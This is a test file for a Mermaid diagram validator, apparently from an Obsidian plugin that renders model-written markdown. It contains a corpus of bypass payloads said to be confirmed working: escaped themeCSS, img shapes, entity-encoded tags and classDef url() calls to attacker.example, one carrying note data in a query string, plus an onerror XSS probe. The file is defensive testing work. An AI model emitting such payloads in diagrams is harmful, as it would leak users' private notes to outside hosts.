import { describe, expect, test } from "bun:test";
import { validateMermaidSource } from "../src/safety/mermaidGuard";
import { sanitizeModelMarkdown } from "../src/safety/sanitize";

const HOST = "attacker.example";

/** The five payloads confirmed against Obsidian's own Mermaid 11.13.0 bundle, plus controls. */
const BYPASS_PAYLOADS: Record<string, string> = {
	"hex-escaped themeCSS in an init directive": [
		"%%{init: {\"themeCSS\": \".nodeLabel, svg {background-image:url(\\\\000068ttp\\\\00003a\\\\00002f\\\\00002f" + HOST + "/x)}\"}}%%",
		"flowchart TD",
		"  A --> B"
	].join("\n"),
	"themeCSS in YAML frontmatter": [
		"---",
		"config:",
		"  themeCSS: \".nodeLabel{background-image:url(\\\\000068ttp\\\\00003a\\\\00002f\\\\00002f" + HOST + "/x)}\"",
		"---",
		"flowchart TD",
		"  A --> B"
	].join("\n"),
	"fontFamily declaration injection": [
		"%%{init: {\"fontFamily\": \"x; background-image: url(\\\\000068ttp\\\\00003a\\\\00002f\\\\00002f" + HOST + "/x)\"}}%%",
		"flowchart TD",
		"  A --> B"
	].join("\n"),
	"YAML \\U escapes in an img shape": [
		"flowchart TD",
		`  A@{ img: "http\\x3a\\U0000002f\\U0000002f${HOST}/x", label: "x" }`
	].join("\n"),
	"#NN; entities spelling an img tag": [
		"flowchart TD",
		`  A["<img src='#104;ttp#58;#47;#47;${HOST}#58;8080/x'>"]`
	].join("\n"),
	"query-carrying img payload": [
		"flowchart TD",
		`  A@{ img: "https://${HOST}/p?d=Q3-board-notes-secret", label: "x" }`
	].join("\n"),
	"plain https URL control": "flowchart TD\n  A[\"Call https://" + HOST + "/x\"] --> B",
	"protocol-relative img control": "flowchart TD\n  A@{ img: \"//" + HOST + "/x.png\" }",
	"single-slash scheme control": "flowchart TD\n  A[\"see http:/" + HOST + "/x.png\"]",
	"CSS hex escapes in a state diagram classDef": [
		"stateDiagram-v2",
		"  classDef evil background:url(http\\3a \\2f\\2f" + HOST + "\\2f hit)",
		"  [*] --> S1",
		"  class S1 evil"
	].join("\n"),
	"literal url() in a state diagram classDef": [
		"stateDiagram-v2",
		`  classDef evil background:url(http://${HOST}/x.png)`,
		"  [*] --> S1"
	].join("\n"),
	"url() in a class diagram style": [
		"classDiagram",
		"  class A",
		`  style A fill:#fff,background:url(${HOST})`
	].join("\n"),
	"themeCSS directive without escapes": [
		"%%{init: {\"themeCSS\": \".label{background:url(" + HOST + ")}\"}}%%",
		"flowchart TD",
		"  A --> B"
	].join("\n"),
	"click with a URL": "flowchart TD\n  A --> B\n  click A \"https://" + HOST + "\"",
	"click href without a scheme": "flowchart TD\n  A --> B\n  click A href \"" + HOST + "\"",
	"click with a mailto target": "flowchart TD\n  A --> B\n  click A \"mailto:a@b.c\"",
	"class diagram link": "classDiagram\n  class A\n  link A \"https://" + HOST + "\" \"tip\"",
	"HTML anchor in a label": "flowchart TD\n  A[\"<a href='mailto:x@y.z'>pay now</a>\"]",
	"HTML image in a sequence message": "sequenceDiagram\n  A->>B: <img src=x onerror=alert(1)>",
	"style element": "flowchart TD\n  A[\"<style>@import 'x'</style>\"]",
	"icon shape": "flowchart TD\n  A@{ icon: \"logos:aws\", label: \"x\" }",
	"unknown shape key": "flowchart TD\n  A@{ shape: rect, onclick: \"x\" }",
	"image-set in a style": "flowchart TD\n  A --> B\n  style A background:image-set(\"x\" 1x)",
	"at-rule import": "flowchart TD\n  A --> B\n  classDef c fill:#fff,@import",
	"markdown string with an image": "flowchart TD\n  A[\"`![x](https://" + HOST + "/x.png)`\"]",
	"C4 link parameter": "C4Context\n  Person(a, \"A\", \"x\", $link=\"https://" + HOST + "\")",
	"directive at the end": "flowchart TD\n  A --> B\n%%{init: {\"theme\": \"base\"}}%%",
	"directive after the header": "flowchart TD\n%%{init: {\"securityLevel\": \"loose\"}}%%\n  A --> B",
	"sequence actor properties with an icon URL": "sequenceDiagram\n  participant A\n  properties A: {\"icon\": \"https://" + HOST + "/x.png\"}",
	"sequence actor properties with a scheme and no slash": "sequenceDiagram\n  participant A\n  properties A: {\"icon\": \"https:" + HOST + "/x.png\"}",
	"sequence actor properties with a relative icon": "sequenceDiagram\n  participant A\n  properties A: {\"icon\": \"x.png\"}",
	"http scheme without slashes in a label": "flowchart TD\n  A[\"http:" + HOST + "/x.png\"]",
	"sequence participant icon metadata": "sequenceDiagram\n  participant A@{ \"icon\": \"https://" + HOST + "/x.png\" }",
	"unknown diagram header": "A --> B",
	"ELK layout": "flowchart-elk TD\n  A --> B",
	"zenuml": "zenuml\n  A.method()",
	"frontmatter in the middle": "flowchart TD\n  A --> B\n---\nconfig:\n  theme: base\n---"
};

/** Realistic generated diagrams that the old denylist downgraded, and ordinary ones. */
const MUST_RENDER: Record<string, string> = {
	"file: label": "flowchart TD\n  A[file: config.yaml] --> B[Parser]",
	"ws: message": "sequenceDiagram\n  Client->>Server: ws: subscribe",
	"slashes in prose": "flowchart LR\n  A[client // server] --> B",
	"ftp: label": "flowchart TD\n  A[ftp: upload] --> B",
	"HTTP: label": "flowchart TD\n  A[HTTP: GET] --> B[Handler]",
	"scheme word in a comment": "flowchart TD\n  %% note: http: later\n  A --> B",
	"participants named File, FTP, WS and HTTP": [
		"sequenceDiagram",
		"  participant File",
		"  participant FTP",
		"  participant WS",
		"  participant HTTP",
		"  File->>FTP: upload file: report.pdf",
		"  FTP->>WS: ping",
		"  WS->>HTTP: GET /users"
	].join("\n"),
	"scheme words as prose": "sequenceDiagram\n  User->>API: Use http: or https: only",
	"plan do check": "flowchart LR\n  A[\"Plan // Do // Check\"] --> B[TCP//IP] --> C[read//write]",
	"styles with hex colours": [
		"flowchart TD",
		"  A[Start]:::primary --> B{Decide}",
		"  B -->|yes| C[Done]",
		"  classDef primary fill:#f9f,stroke:#333,stroke-width:4px,color:#000;",
		"  style C fill:#bbf,stroke:#f66,stroke-width:2px,stroke-dasharray: 5 5",
		"  linkStyle 0 stroke:#ff3,stroke-width:4px;",
		"  linkStyle default interpolate basis"
	].join("\n"),
	"a style statement after a semicolon": "flowchart TD\n  A --> B; style A fill:#f9f,stroke:#333;",
	"cylinder shape data": "flowchart TD\n  A@{ shape: cylinder, label: \"Database\" } --> B@{ shape: rect }",
	"line breaks": "flowchart TD\n  A[\"First line<br/>second line<br>third<br />fourth\"] --> B",
	"allowed entities": "flowchart TD\n  A[\"He said #quot;hi#quot; and used #35;1 and #59; and #40;x#41;\"] --> B",
	"state diagram with a fork and a class": [
		"stateDiagram-v2",
		"  state fork_state <<fork>>",
		"  [*] --> fork_state",
		"  fork_state --> Idle",
		"  classDef busy fill:#f00,color:white,font-weight:bold,stroke-width:2px,stroke:yellow",
		"  class Idle busy"
	].join("\n"),
	"class diagram with annotations and a file member": [
		"classDiagram",
		"  class Repo {",
		"    <<interface>>",
		"    +file: string",
		"    +read() string",
		"  }",
		"  Animal <|-- Dog",
		"  Dog --> Repo : uses"
	].join("\n"),
	"entity relationship diagram": [
		"erDiagram",
		"  CUSTOMER ||--o{ ORDER : places",
		"  ORDER ||--|{ LINE_ITEM : contains",
		"  CUSTOMER {",
		"    string name",
		"    string email",
		"  }"
	].join("\n"),
	"gantt chart": [
		"gantt",
		"  title Plan",
		"  dateFormat YYYY-MM-DD",
		"  section Build",
		"  Design :a1, 2026-01-01, 10d",
		"  Code :after a1, 20d",
		"  todayMarker stroke-width:5px,stroke:#0f0,opacity:0.5"
	].join("\n"),
	"pie with a scheme word": "pie title Share of file: types\n  \"Images\" : 40\n  \"Docs\" : 60",
	"user journey": "journey\n  title My day\n  section Work\n    Make tea: 5: Me\n    Do work: 1: Me, Cat",
	"mindmap with words that look like statements": [
		"mindmap",
		"  root((Design))",
		"    style guide",
		"    link building",
		"    class names",
		"    click targets"
	].join("\n"),
	"timeline": "timeline\n  title History\n  2002 : LinkedIn\n  2004 : Facebook : Google",
	"quadrant chart with point styles": [
		"quadrantChart",
		"  title Reach and engagement",
		"  x-axis Low Reach --> High Reach",
		"  y-axis Low Engagement --> High Engagement",
		"  quadrant-1 We should expand",
		"  Campaign A: [0.3, 0.6] radius: 12, color: #ff3300, stroke-color: #10f0f0, stroke-width: 5px"
	].join("\n"),
	"sankey": "sankey-beta\n\nSource,Target,Value\nA,B,10\nB,C,5",
	"xy chart": "xychart-beta\n  title \"Sales\"\n  x-axis [jan, feb, mar]\n  y-axis \"Revenue\" 0 --> 100\n  bar [10, 20, 30]",
	"architecture": [
		"architecture-beta",
		"  group api(cloud)[API]",
		"  service db(database)[Database] in api",
		"  service server(server)[Server] in api",
		"  db:L -- R:server"
	].join("\n"),
	"kanban with metadata": [
		"kanban",
		"  Todo",
		"    docs[Create Documentation]",
		"    id3[Update Database]@{ ticket: MC-2037, assigned: 'knsv', priority: 'High' }"
	].join("\n"),
	"git graph": "gitGraph\n  commit\n  branch develop\n  checkout develop\n  commit id: \"feat: login\"\n  checkout main\n  merge develop",
	"requirement diagram": [
		"requirementDiagram",
		"  requirement test_req {",
		"    id: 1",
		"    text: the test text.",
		"    risk: high",
		"    verifymethod: test",
		"  }",
		"  element test_entity {",
		"    type: simulation",
		"  }",
		"  test_entity - satisfies -> test_req"
	].join("\n"),
	"C4 context": [
		"C4Context",
		"  title System context",
		"  Person(user, \"User\", \"Reads notes\")",
		"  System(app, \"AskMate\", \"Answers questions\")",
		"  Rel(user, app, \"Uses\")"
	].join("\n"),
	"block diagram": "block-beta\n  columns 3\n  a b c\n  style a fill:#969,stroke:#333",
	"radar": "radar-beta\n  axis a[\"A\"], b[\"B\"], c[\"C\"]\n  curve x[\"X\"]{1, 2, 3}",
	"treemap": "treemap-beta\n\"Section 1\"\n  \"Leaf 1\": 12\n  \"Leaf 2\": 5",
	"nested subgraphs with directions": [
		"flowchart TB",
		"  subgraph One",
		"    direction LR",
		"    a1 --> a2",
		"  end",
		"  subgraph Two [\"Second group\"]",
		"    b1 --> b2",
		"  end",
		"  One --> Two"
	].join("\n"),
	"state transitions with a file verb": "stateDiagram-v2\n  [*] --> File: open\n  File --> Saved: save file: x",
	"comparison operators and arrows": "flowchart LR\n  A{x < 5?} -->|yes| B[a <= b]\n  A -->|no| C[b >= a]\n  B <--> C",
	"sequence arrows": "sequenceDiagram\n  A->>B: hi\n  B-->>A: ok\n  A-)B: async\n  A<<->>B: both",
	"leading comments and blank lines": "\n%% a note\n\nflowchart TD\n  A --> B",
	"CRLF line endings": "flowchart TD\r\n  A --> B\r\n  B --> C\r\n",
	"sequence participant types": "sequenceDiagram\n  participant API@{ \"type\": \"boundary\" }\n  participant DB@{ \"type\" : \"database\" }\n  participant Q@{ \"type\": \"queue\", \"alias\": \"Queue\" }\n  API->>DB: query",
	"ampersands in labels": "flowchart TD\n  A[\"R&D and Q&A\"] --> B[\"AT&T &amp; co\"]"
};

describe("validateMermaidSource: bypass corpus", () => {
	for (const [name, source] of Object.entries(BYPASS_PAYLOADS)) {
		test(`blocks ${name}`, () => {
			const result = validateMermaidSource(source);
			expect(result.ok).toBe(false);
			expect(result.reasons.length).toBeGreaterThan(0);
			for (const reason of result.reasons) {
				expect(reason.message.length).toBeGreaterThan(5);
				expect(reason.code.length).toBeGreaterThan(0);
			}
		});
	}

	test("blocks every payload even when plugin headers are allowed", () => {
		for (const [name, source] of Object.entries(BYPASS_PAYLOADS)) {
			expect({ name, ok: validateMermaidSource(source, { allowPluginHeader: true }).ok }).toEqual({ name, ok: false });
		}
	});
});

describe("validateMermaidSource: must-render corpus", () => {
	for (const [name, source] of Object.entries(MUST_RENDER)) {
		test(`passes ${name}`, () => {
			const result = validateMermaidSource(source);
			expect({ ok: result.ok, reasons: result.reasons.map((reason) => `${reason.code}@${reason.line}: ${reason.message}`) })
				.toEqual({ ok: true, reasons: [] });
		});
	}

	test("the corpus has at least thirty diagrams", () => {
		expect(Object.keys(MUST_RENDER).length).toBeGreaterThanOrEqual(30);
	});

	test("reports the diagram type", () => {
		expect(validateMermaidSource("sequenceDiagram\n  A->>B: hi").diagramType).toBe("sequenceDiagram");
		expect(validateMermaidSource("\n%% c\ngraph LR\n A-->B").diagramType).toBe("graph");
		expect(validateMermaidSource("stateDiagram-v2\n [*] --> A").diagramType).toBe("stateDiagram-v2");
	});
});

describe("validateMermaidSource: reasons", () => {
	test("names the problem and the line", () => {
		const result = validateMermaidSource("flowchart TD\n  A --> B\n  A[\"see https://example.com\"]");
		expect(result.ok).toBe(false);
		expect(result.reasons[0]).toMatchObject({ code: "remote-reference", line: 3 });
		expect(result.reasons[0].message).toContain("line 3");
	});

	test("explains each failure family", () => {
		const codeFor = (source: string): string[] => validateMermaidSource(source).reasons.map((reason) => reason.code);
		expect(codeFor("")).toEqual(["empty"]);
		expect(codeFor("   \n  ")).toEqual(["empty"]);
		expect(codeFor("hello world")).toEqual(["unknown-header"]);
		expect(codeFor("---\ntitle: x\n---\nflowchart TD\n A-->B")).toContain("frontmatter");
		expect(codeFor("flowchart TD\n%%{init: {}}%%\n A-->B")).toContain("directive");
		expect(codeFor("flowchart TD\n A[\"a\\\\b\"]")).toContain("backslash");
		expect(codeFor("flowchart TD\n A[\"<b>x</b>\"]")).toContain("html");
		expect(codeFor("flowchart TD\n A[\"#104;\"]")).toContain("entity");
		expect(codeFor("flowchart TD\n A --> B\n click A \"x\"")).toContain("interaction");
		expect(codeFor("flowchart TD\n A@{ img: \"x\" }")).toContain("shape-data");
		expect(codeFor("flowchart TD\n A --> B\n style A fill:url(x)")).toContain("css-function");
		expect(codeFor("flowchart TD\n A --> B\n style A behavior:x")).toContain("style-statement");
		expect(codeFor("flowchart TD\n A[\"`bold`\"]")).toContain("markdown-string");
		expect(codeFor("flowchart TD\n A@{ shape: rect")).toContain("unterminated");
		expect(codeFor("flowchart-elk TD\n A-->B")).toContain("unknown-header");
		expect(codeFor("flowchart TD\n A[\"x\u202Ey\"]")).toContain("bidi-control");
		expect(codeFor("flowchart TD\n A[\"x\u0000y\"]")).toContain("control-character");
		expect(codeFor(`flowchart TD\n A[\"${"x".repeat(200_000)}\"]`)).toEqual(["too-long"]);
	});

	test("caps the number of reasons", () => {
		const source = `flowchart TD\n${Array.from({ length: 50 }, (_, index) => `  A${index}["https://e.example/${index}"]`).join("\n")}`;
		expect(validateMermaidSource(source).reasons.length).toBeLessThanOrEqual(8);
	});
});

describe("validateMermaidSource: plugin-built headers", () => {
	const header = [
		"---",
		"config:",
		"  theme: base",
		"  look: handDrawn",
		"  layout: dagre",
		"  themeVariables:",
		"    primaryColor: \"#352FA0\"",
		"    primaryTextColor: '#EDEFFC'",
		"    lineColor: \"#46D9B0\"",
		"    fontSize: 16px",
		"---"
	].join("\n");

	test("is rejected by default, because the model never writes frontmatter", () => {
		const result = validateMermaidSource(`${header}\nflowchart TD\n  A --> B`);
		expect(result.ok).toBe(false);
		expect(result.reasons[0].code).toBe("frontmatter");
	});

	test("is accepted when the plugin built it and the option is set", () => {
		const result = validateMermaidSource(`${header}\nflowchart TD\n  A --> B\n  classDef primary fill:#352FA0,stroke:#9C98FF,color:#ffffff;`, { allowPluginHeader: true });
		expect(result).toMatchObject({ ok: true, diagramType: "flowchart" });
	});

	test("still validates the body after a plugin header", () => {
		const result = validateMermaidSource(`${header}\nflowchart TD\n  A[\"https://e.example\"]`, { allowPluginHeader: true });
		expect(result.ok).toBe(false);
		expect(result.reasons[0].code).toBe("remote-reference");
	});

	test("rejects headers that go beyond the plugin grammar", () => {
		const bad = [
			"---\nconfig:\n  themeCSS: \".x{color:red}\"\n---\nflowchart TD\n A-->B",
			"---\nconfig:\n  theme: base\n  themeVariables:\n    primaryColor: \"red; background:url(x)\"\n---\nflowchart TD\n A-->B",
			"---\nconfig:\n  fontFamily: x\n---\nflowchart TD\n A-->B",
			"---\nconfig:\n  layout: elk\n---\nflowchart TD\n A-->B",
			"---\nconfig:\n  theme: base\n  securityLevel: loose\n---\nflowchart TD\n A-->B",
			"---\nconfig:\n  theme: base\n---\n---\nflowchart TD\n A-->B",
			"---\nconfig:\n  theme: base\nflowchart TD\n A-->B",
			"---\nconfig:\n  themeVariables:\n    primaryColor: \"#fff\\u0041\"\n---\nflowchart TD\n A-->B"
		];
		for (const source of bad) {
			expect({ source, ok: validateMermaidSource(source, { allowPluginHeader: true }).ok }).toEqual({ source, ok: false });
		}
	});

	test("accepts a safe title and rejects an unsafe one", () => {
		expect(validateMermaidSource("---\ntitle: My plan (2026)\n---\nflowchart TD\n A-->B", { allowPluginHeader: true }).ok).toBe(true);
		expect(validateMermaidSource("---\ntitle: <img src=x>\n---\nflowchart TD\n A-->B", { allowPluginHeader: true }).ok).toBe(false);
	});
});

describe("validateMermaidSource: performance", () => {
	test("large diagrams validate quickly", () => {
		const body = Array.from({ length: 1500 }, (_, index) => `  N${index}[Node ${index}] --> N${index + 1}[Node ${index + 1}]`).join("\n");
		const started = performance.now();
		const result = validateMermaidSource(`flowchart TD\n${body}`);
		expect(performance.now() - started).toBeLessThan(500);
		expect(result.ok).toBe(true);
	});

	test("adversarial shape-data input stays linear", () => {
		const source = `flowchart TD\n${"A@{ ".repeat(5000)}`;
		const started = performance.now();
		const result = validateMermaidSource(source);
		expect(performance.now() - started).toBeLessThan(500);
		expect(result.ok).toBe(false);
	});

	// The scheme check once scanned to the end of any run of letters from every position in it: 1.6 s at 80,000 characters.
	const longLabels: Record<string, string> = {
		"letters": "a".repeat(90_000),
		"letters and digits": "a1".repeat(45_000),
		"dots": "a.".repeat(45_000),
		"plus signs": "a+".repeat(45_000),
		"hyphens": "a-".repeat(45_000),
		"scheme-like words": "http".repeat(22_000),
		"colons without a slash": "a:".repeat(45_000),
		"a long token ending in a scheme and slash": `${"a".repeat(89_990)}:/x`
	};

	for (const [name, label] of Object.entries(longLabels)) {
		test(`a 90,000-character label of ${name} stays linear`, () => {
			const started = performance.now();
			const result = validateMermaidSource(`flowchart TD\nA[${label}]`);
			expect(performance.now() - started).toBeLessThan(300);
			expect(result.ok).toBe(name !== "a long token ending in a scheme and slash");
		});
	}

	test("a long label inside a sanitised fence stays linear", () => {
		const started = performance.now();
		const text = sanitizeModelMarkdown(`\`\`\`mermaid\nflowchart TD\nA[${"a".repeat(90_000)}]\n\`\`\``);
		expect(performance.now() - started).toBeLessThan(300);
		expect(text).toStartWith("```mermaid");
	});

	test("a scheme longer than the cap is still found when it is followed by a slash", () => {
		const result = validateMermaidSource(`flowchart TD\nA[${"x".repeat(60)}://host/path]`);
		expect(result.ok).toBe(false);
		expect(result.reasons[0].code).toBe("remote-reference");
	});
});
